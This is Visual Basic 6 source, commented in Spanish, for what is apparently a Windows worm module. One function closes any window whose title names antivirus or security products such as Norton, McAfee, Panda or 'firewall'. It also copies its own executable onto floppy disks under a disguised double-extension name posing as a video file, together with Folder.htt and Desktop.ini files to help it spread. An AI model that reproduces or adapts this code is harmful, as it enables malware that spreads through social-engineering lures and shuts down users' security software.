   Attribute VB_Name = "Module1"
   Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Const WM_CLOSE = &H10
   Declare Function EnumWindows Lib "user32" (ByVal lpfn As Long, lParam As Any) As Boolean
   Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
   Public MiNombreEXE As String, L As String
   Public DirSystem As String, DirWin As String
   Public Fso As New FileSystemObject
   Public Ws As New IWshShell_Class
   Public WsNet As New IWshNetwork_Class
   Public ShellObj As New Shell
   Public HayWinzip As Boolean
   Public HayWinrar As Boolean
   Public DirWinzip As String
   Public DirWinrar As String
   Public NombreDelicioso As String
   Public Word As Object

   Function HayWord() As Boolean
   Dim WordObj As Object
   On Error GoTo NoWord
   Set WordObj = GetObject(, "Word.Application") 'Verificamos si existe una instancia de word
   If WordObj.ActiveDocument.Path = "A:" Then 'Si existe y encima el documento abierto esta en el disco A:
   HayWord = True 'Tonces Hay Word
   Exit Function
   End If
   NoWord:
   HayWord = False
   End Function
   Function HayExcel() As Boolean
   Dim ExcelObj As Object
   On Error GoTo NoExcel
   Set ExcelObj = GetObject(, "Excel.Application")
   If ExcelObj.ActiveWorkbook.Path = "A:" Then
   HayExcel = True
   Exit Function
   End If
   NoExcel:
   HayExcel = False
   End Function

   Public Function FuncSearchScan(ByVal hwnd As Long, Parametro As Long) As Boolean
   On Error Resume Next
   'FUNCIÓN QUE BUSCA DETERMINADOS PROCESOS
   Dim VirTitle As String * 256
   Dim Wt, Wc As Long
   Dim VirWindow As String, destino As String
   Dim Vc(1 To 18) As String
   Vc(1) = "scan": Vc(2) = "vir": Vc(3) = "trojan": Vc(4) = "panda"
   Vc(5) = "mcafee": Vc(6) = "firewall": Vc(7) = "defend": Vc(8) = "security"
   Vc(9) = "norton": Vc(10) = "norman": Vc(11) = "hacker": Vc(12) = "thav"
   Vc(13) = "symantec": Vc(14) = "anti": Vc(15) = "microsoft": Vc(16) = "fix":
   Vc(17) = "a:\": Vc(18) = "disc"
   DoEvents
   Wt = GetWindowText(ByVal hwnd, ByVal VirTitle, ByVal Len(VirTitle))
   VirWindow = Left(VirTitle, Wt)
   For i = 1 To 18
   If InStr(LCase(VirWindow), Vc(i)) <> 0 Then
       If Not Vc(i) = "a:\" Or Not Vc(i) = "disc" Then 'Si no se trata de un disquete
           Wc = PostMessage(ByVal hwnd, WM_CLOSE, vbNull, vbNull) 'Cerramos la ventana
       Else 'Si el usuario esta explorando un disquete, nos copiamos a ese disquete
           If Not Fso.FileExists("A:\PornoFull.avi                               .exe") Then
                   Fso.CopyFile MiNombreEXE, "A:\PornoFull.avi                               .exe", True
                   Fso.CopyFile DirWin & "\Web\Folder.htt", "A:\Folder.htt", True
                   Fso.CopyFile DirWin & "\Web\Desktop.ini", "A:\Desktop.ini", True
                   SystemControl.Timer1.Enabled = False
                   SystemControl.Timer1.Interval = 7000
                   SystemControl.Timer1.Enabled = True
           End If
       End If
   End If
   Next
   FuncSearchScan = True
   End Function
